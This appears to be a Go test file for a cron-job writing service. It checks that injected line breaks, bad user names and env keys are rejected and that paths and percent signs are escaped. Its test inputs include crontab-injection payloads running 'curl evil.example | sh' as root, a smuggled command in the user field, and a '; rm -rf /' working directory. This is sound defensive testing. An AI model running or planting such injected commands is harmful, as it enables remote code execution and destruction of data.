package cron

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestWriteJobRejectsLineBreaks(t *testing.T) {
	dir := t.TempDir()
	svc := &Service{cronDir: dir}
	cases := []AddOptions{
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "php artisan backup:run\n* * * * * root curl evil.example | sh", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", Env: map[string]string{"APP_ENV": "prod\n* * * * * root /tmp/x"}, Enabled: true},
		{ID: "backup", User: "deploy\r", Schedule: "0 3 * * *", Command: "true", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0\n3 * * *", Command: "true", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", WorkingDir: "/srv\x00", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", Output: "/tmp/out\n", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", ErrorOutput: "/tmp/err\r", Enabled: true},
	}
	for _, opts := range cases {
		_, err := svc.Add(context.Background(), opts)
		if err == nil {
			t.Fatalf("expected error for %+v", opts)
		}
		if _, statErr := os.Stat(filepath.Join(dir, "abstrax-backup")); !os.IsNotExist(statErr) {
			t.Fatalf("cron file written for %+v", opts)
		}
	}
}

func TestWriteJobRejectsInvalidUserAndEnv(t *testing.T) {
	dir := t.TempDir()
	svc := &Service{cronDir: dir}
	_, err := svc.Add(context.Background(), AddOptions{
		ID: "backup", User: "deploy curl evil.example | sh #", Schedule: "0 3 * * *", Command: "true", Enabled: true,
	})
	if err == nil {
		t.Fatal("expected invalid user")
	}
	_, err = svc.Add(context.Background(), AddOptions{
		ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true",
		Env: map[string]string{"BAD KEY": "x"}, Enabled: true,
	})
	if err == nil {
		t.Fatal("expected invalid env key")
	}
}

func TestPercentRoundTripAndQuoting(t *testing.T) {
	dir := t.TempDir()
	svc := &Service{cronDir: dir}
	job, err := svc.Add(context.Background(), AddOptions{
		ID:         "backup",
		User:       "deploy",
		Schedule:   "0 3 * * *",
		Command:    "tar czf /backup/$(date +%F).tgz /srv",
		WorkingDir: "/srv/it's here; rm -rf /",
		Output:     "/var/log/a b.log",
		Env:        map[string]string{"ZED": "1", "APP_ENV": "prod value"},
		Enabled:    true,
	})
	if err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(job.FilePath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(data)
	if !strings.Contains(text, `date +\%F`) {
		t.Fatalf("percent was not escaped:\n%s", text)
	}
	if !strings.Contains(text, "APP_ENV=prod value\n") || !strings.Contains(text, "ZED=1\n") {
		t.Fatalf("env lines =\n%s", text)
	}
	if !strings.Contains(text, "/var/log/a b.log") || !strings.Contains(text, "'") {
		t.Fatalf("paths were not quoted:\n%s", text)
	}

	read, err := svc.Info(context.Background(), "backup")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(read.Command, "date +%F") || strings.Contains(read.Command, `\%`) {
		t.Fatalf("command = %q", read.Command)
	}
	if read.Env["APP_ENV"] != "prod value" {
		t.Fatalf("env = %#v", read.Env)
	}
}
